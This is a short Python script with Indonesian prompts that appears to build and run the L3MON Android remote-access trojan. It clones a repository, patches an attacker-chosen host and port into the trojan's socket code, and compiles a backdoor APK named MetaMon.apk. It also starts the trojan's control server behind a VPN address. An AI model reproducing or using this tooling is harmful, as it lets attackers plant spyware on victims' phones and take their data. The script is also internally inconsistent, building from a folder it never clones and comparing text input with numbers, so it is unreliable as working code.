#!/usr/bin/python3

import os
import time
import sys
import fileinput

os.system('clear')
	
def run():
	try:
		print('[+] checking ip forwarder')
		time.sleep(2)
		os.system("ip addr show tun0 |grep -oP '(?<=inet\s)[\da-f.:]+' >ip")
		ip=open('ip')
		myIP=ip.read().rstrip()
		myIP == " "
		monvip=("http://"+myIP+":22533/login")
		if not myIP:
			print('[x] IP forwarder Not Connected.')
			exit()
		else:
			print('[*] IP forwarder Connected')
			print('[+] starting MonVIP')
			os.system("cd server;proot pm2 delete all >logs;proot pm2 start index.js > logs && xdg-open "+(monvip))
	except:
		time.sleep(2)
		print('[!] You must to activate OpenVPN first ')
		exit()
		
def backdoor():
	print ('[+] cleaning')
	os.system('rm -rf tj >logs')
	time.sleep(2)
	print ('[+] Mengunduh File 276kb')
	os.system('git clone https://github.com/admstt/T')
	textToSearch = 'host:port'
	host = input('Host : ')
	port = input('Port : ')
	textToReplace = str(host)+":"+str(port)
	fileToSearch  = 'T/smali/com/etechd/l3mon/IOSocket.smali'
	tempFile = open( fileToSearch, 'r+' )
	for line in fileinput.input( fileToSearch ):
		if textToSearch in line :
			print('gagal menemukan host')
		else:
			print('gagal menemukan file')
		tempFile.write( line.replace( textToSearch, textToReplace ) )
	tempFile.close()
	print ('[+] generating backdoor')
	os.system('apktool b tj -o MetaMon.apk')
	print ('[+] memindahkan File')
	os.system('mv MetaMon.apk /sdcard/MetaMon.apk')
	print ('[*] cleaning')
	os.system('rm -rf tj')

def menu():
	print ('Pilih Salah Satu Menu')
	print ('')
	print ('{1} Run MonVIP')
	print ('{2} Create Backdoor Apk')
	print ('{3} exit')
	g=input('pilih : ')
	if g == '':
		menu()
	elif g == 1:
		run()
	elif g == 2:
		backdoor()
	elif g == 3:
		exit()
	else:
		exit()
		
menu()
